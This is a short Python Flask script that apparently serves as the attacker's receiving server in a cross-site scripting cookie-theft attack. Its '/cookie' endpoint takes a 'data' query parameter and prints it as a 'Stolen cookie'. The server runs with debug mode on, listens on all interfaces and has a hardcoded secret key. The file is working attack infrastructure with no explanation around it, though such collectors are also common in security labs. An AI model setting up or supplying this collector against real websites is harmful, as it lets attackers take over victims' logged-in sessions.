from flask import Flask, request, flash

app = Flask(__name__)
app.config['SECRET_KEY'] = 'f1c50cdf58a5ac7024799454'

@app.route("/")
def home():
    return "Homepage"

@app.route("/cookie", methods=["GET", "POST"])
def cookie():
    if request.method == "GET":
        cookie = request.args.get("data")
        print(f"\nStolen cookie: '{cookie}'\n")
    return "Cookie"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5001)